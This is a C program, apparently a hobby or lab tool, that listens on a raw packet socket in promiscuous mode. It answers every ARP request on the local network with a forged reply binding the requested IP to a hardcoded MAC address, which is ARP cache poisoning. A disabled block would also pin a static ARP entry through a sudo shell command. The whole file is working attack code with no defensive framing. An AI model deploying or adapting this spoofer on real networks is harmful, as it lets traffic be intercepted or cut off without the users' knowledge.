#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
 
#include <asm/types.h>
 
#include <math.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
 
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
 
#define BUF_SIZE 42
#define DEVICE "wlp2s0b1"
#define ETH_P_NULL 0x0
#define ETH_MAC_LEN ETH_ALEN
#define ETH_ARP 0x0806

int s = -1; /*Socketdescriptor*/
void* buffer = NULL;
long total_packets = 0;
long answered_packets = 0;

struct __attribute__((packed)) arp_header 
{
        unsigned short arp_hd;
        unsigned short arp_pr;
        unsigned char arp_hdl;
        unsigned char arp_prl;
        unsigned short arp_op;
        unsigned char arp_sha[6];
        unsigned char arp_spa[4];
        unsigned char arp_dha[6];
        unsigned char arp_dpa[4];
};
 
void sigint(int signum) {
        /*Clean up.......*/
 
        struct ifreq ifr;
 
        if (s == -1)
                return;
 
        strncpy(ifr.ifr_name, DEVICE, IFNAMSIZ);
        ioctl(s, SIOCGIFFLAGS, &ifr);
        ifr.ifr_flags &= ~IFF_PROMISC;
        ioctl(s, SIOCSIFFLAGS, &ifr);
        close(s);
 
        free(buffer);
 
        printf("Server terminating....\n");
 
        printf("Totally received: %ld packets\n", total_packets);
        printf("Answered %ld packets\n", answered_packets);
        exit(0);
}

int main(void) {

        buffer = (void*)malloc(BUF_SIZE); /*Buffer for Ethernet Frame*/
        unsigned char* etherhead = buffer;      /*Pointer to Ethenet Header*/
        struct ethhdr *eh = (struct ethhdr *)etherhead; /*Another pointer to
                                                          ethernet header*/
        unsigned char* arphead = buffer + 14;
        struct arp_header *ah;
        unsigned char src_mac[6];        /*our MAC address*/
 
        struct ifreq ifr;
        struct sockaddr_ll socket_address;
        int ifindex = 0;         /*Ethernet Interface index*/
        int i;
        int length;      /*length of received packet*/
        int sent;
 
        printf("Server started, entering initialiation phase...\n");
 
        /*open socket*/
        s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (s == -1) {
                perror("socket():");
                exit(1);
        }
        printf("Successfully opened socket: %i\n", s);
 
        /*retrieve ethernet interface index*/
        strncpy(ifr.ifr_name, DEVICE, IFNAMSIZ);
        if (ioctl(s, SIOCGIFINDEX, &ifr) == -1) {
                perror("SIOCGIFINDEX");
                exit(1);
        }
        ifindex = ifr.ifr_ifindex;
        printf("Successfully got interface index: %i\n", ifindex);
 
        /*retrieve corresponding MAC*/
        if (ioctl(s, SIOCGIFHWADDR, &ifr) == -1) {
                perror("SIOCGIFINDEX");
                exit(1);
        }
        for (i = 0; i < 6; i++) {
                src_mac[i] = ifr.ifr_hwaddr.sa_data[i];
        }
        printf("Successfully got our MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
               src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]);
 
        /*prepare sockaddr_ll*/
        socket_address.sll_family = PF_PACKET;
        socket_address.sll_protocol = htons(ETH_P_ARP);
        socket_address.sll_ifindex = ifindex;
        socket_address.sll_hatype = ARPHRD_ETHER;
        socket_address.sll_pkttype = 0; //PACKET_OTHERHOST;
        socket_address.sll_halen = 0;
        socket_address.sll_addr[6] = 0x00;
        socket_address.sll_addr[7] = 0x00;
        /*establish signal handler*/
        signal(SIGINT, sigint);
        printf("Successfully established signal handler for SIGINT\n");
        printf("We are in production state, waiting for incoming packets....\n");
 
        while (1) {
                /*Wait for incoming packet...*/
                length = recvfrom(s, buffer, BUF_SIZE, 0, NULL, NULL);
                if (length == -1)
                        {
                                perror("recvfrom():");
                                exit(1);
                        }
                if(ntohs(eh->h_proto) == ETH_P_ARP)
                        {
 
                                unsigned char buf_arp_dha[6];
                                unsigned char buf_arp_dpa[4];
 
                                ah = (struct arp_header *)arphead;
                                if(ntohs(ah->arp_op) != ARPOP_REQUEST)
                                        continue;
                                printf("buffer is---------------- %s \n",(char*)ah);
                                printf("H/D TYPE : %x PROTO TYPE : %x \n",ah->arp_hd,ah->arp_pr);
                                printf("H/D leng : %x PROTO leng : %x \n",ah->arp_hdl,ah->arp_prl);
                                printf("OPERATION : %x \n", ah->arp_op);
                                printf("SENDER MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                       ah->arp_sha[0],
                                       ah->arp_sha[1],
                                       ah->arp_sha[2],
                                       ah->arp_sha[3],
                                       ah->arp_sha[4],
                                       ah->arp_sha[5]
                                       );
                                printf("SENDER IP address: %02d:%02d:%02d:%02d\n",
                                       ah->arp_spa[0],
                                       ah->arp_spa[1],
                                       ah->arp_spa[2],
                                       ah->arp_spa[3]
                                       );
                                #if 0
                                if(ah->arp_spa[0]==10&&ah->arp_spa[1]==00&&ah->arp_spa[2]==00&&ah->arp_spa[3]==01)
                                        {
                                                printf("Sender ip is .............bam bam..........................................\n");
                                                system("sudo arp -s 10.0.0.1  00:1e:73:91:04:0d");
                                        }
                                #endif
                                printf("TARGET MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                       ah->arp_dha[0],
                                       ah->arp_dha[1],
                                       ah->arp_dha[2],
                                       ah->arp_dha[3],
                                       ah->arp_dha[4],
                                       ah->arp_dha[5]
                                       );
                                printf("TARGET IP address: %02d:%02d:%02d:%02d\n",
                                       ah->arp_dpa[0],
                                       ah->arp_dpa[1],
                                       ah->arp_dpa[2],
                                       ah->arp_dpa[3]
                                       );
 
                                printf("+++++++++++++++++++++++++++++++++++++++\n" );
                                printf("ETHER DST MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                       eh->h_dest[0],
                                       eh->h_dest[1],
                                       eh->h_dest[2],
                                       eh->h_dest[3],
                                       eh->h_dest[4],
                                       eh->h_dest[5]
                                       );
                                printf("ETHER SRC MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                       eh->h_source[0],
                                       eh->h_source[1],
                                       eh->h_source[2],
                                       eh->h_source[3],
                                       eh->h_source[4],
                                       eh->h_source[5]
                                       );
                                memcpy( (void*)etherhead, (const void*)(etherhead+ETH_MAC_LEN),
                                        ETH_MAC_LEN);
                                memcpy( (void*)(etherhead+ETH_MAC_LEN), (const void*)src_mac,
                                        ETH_MAC_LEN);
                                eh->h_proto = htons(ETH_P_ARP);
                                printf("&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& \n");
                                printf("ETHER DST MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                       eh->h_dest[0],
                                       eh->h_dest[1],
                                       eh->h_dest[2],
                                       eh->h_dest[3],
                                       eh->h_dest[4],
                                       eh->h_dest[5]
                                       );
                                printf("ETHER SRC MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                       eh->h_source[0],
                                       eh->h_source[1],
                                       eh->h_source[2],
                                       eh->h_source[3],
                                       eh->h_source[4],
                                       eh->h_source[5]
                                       );
                                //ah->arp_hd = ntohs(ah->arp_hd);
                                //ah->arp_pr = ntohs(ah->arp_pr);
 
                                ah->arp_op = htons(ARPOP_REPLY);
 
                                buf_arp_dpa[0] = ah->arp_dpa[0];
                                buf_arp_dpa[1] = ah->arp_dpa[1];
                                buf_arp_dpa[2] = ah->arp_dpa[2];
                                buf_arp_dpa[3] = ah->arp_dpa[3];
 
                                ah->arp_dha[0] = ah->arp_sha[0];
                                ah->arp_dha[1] = ah->arp_sha[1];
                                ah->arp_dha[2] = ah->arp_sha[2];
                                ah->arp_dha[3] = ah->arp_sha[3];
                                ah->arp_dha[4] = ah->arp_sha[4];
                                ah->arp_dha[5] = ah->arp_sha[5];
 
                                ah->arp_dpa[0] = ah->arp_spa[0];
                                ah->arp_dpa[1] = ah->arp_spa[1];
                                ah->arp_dpa[2] = ah->arp_spa[2];
                                ah->arp_dpa[3] = ah->arp_spa[3];
 
                                ah->arp_spa[0] = buf_arp_dpa[0];
                                ah->arp_spa[1] = buf_arp_dpa[1];
                                ah->arp_spa[2] = buf_arp_dpa[2];
                                ah->arp_spa[3] = buf_arp_dpa[3];
                                //change the sender mac address
                                ah->arp_sha[0] = 0x00;
                                ah->arp_sha[1] = 0x1e;
                                ah->arp_sha[2] = 0x73;
                                ah->arp_sha[3] = 0x78;
                                ah->arp_sha[4] = 0x9a;
                                ah->arp_sha[5] = 0x0d;
 
                                socket_address.sll_addr[0] = eh->h_dest[0];
                                socket_address.sll_addr[1] = eh->h_dest[1];
                                socket_address.sll_addr[2] = eh->h_dest[2];
                                socket_address.sll_addr[3] = eh->h_dest[3];
                                socket_address.sll_addr[4] = eh->h_dest[4];
                                socket_address.sll_addr[5] = eh->h_dest[5];
                                printf("=======================================\n" );
                                printf("SENDER MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                       ah->arp_sha[0],
                                       ah->arp_sha[1],
                                       ah->arp_sha[2],
                                       ah->arp_sha[3],
                                       ah->arp_sha[4],
                                       ah->arp_sha[5]
                                       );
                                printf("SENDER IP address: %02d:%02d:%02d:%02d\n",
                                       ah->arp_spa[0],
                                       ah->arp_spa[1],
                                       ah->arp_spa[2],
                                       ah->arp_spa[3]
                                       );
                                if((ah->arp_spa[0]==10 && ah->arp_spa[1]==0 && ah->arp_spa[2]==0 && ah->arp_spa[3]==1))
                                        printf("------------------------------------------10.0.0.1-----------------------------------------\n");
                                printf("TARGET MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                       ah->arp_dha[0],
                                       ah->arp_dha[1],
                                       ah->arp_dha[2],
                                       ah->arp_dha[3],
                                       ah->arp_dha[4],
                                       ah->arp_dha[5]
                                       );
                                printf("TARGET IP address: %02d:%02d:%02d:%02d\n",
                                       ah->arp_dpa[0],
                                       ah->arp_dpa[1],
                                       ah->arp_dpa[2],
                                       ah->arp_dpa[3]
                                       );
                                printf("H/D TYPE : %x PROTO TYPE : %x \n",ah->arp_hd,ah->arp_pr);
                                printf("H/D leng : %x PROTO leng : %x \n",ah->arp_hdl,ah->arp_prl);
                                printf("OPERATION : %x \n", ah->arp_op);
 
                                sent = sendto(s, buffer, BUF_SIZE, 0, (struct
                                                                       sockaddr*)&socket_address, sizeof(socket_address));
                                if (sent == -1)
                                        {
                                                perror("sendto():");
                                                exit(1);
                                        }
 
                                answered_packets++;
 
                        }
 
                total_packets++;
 
        }
}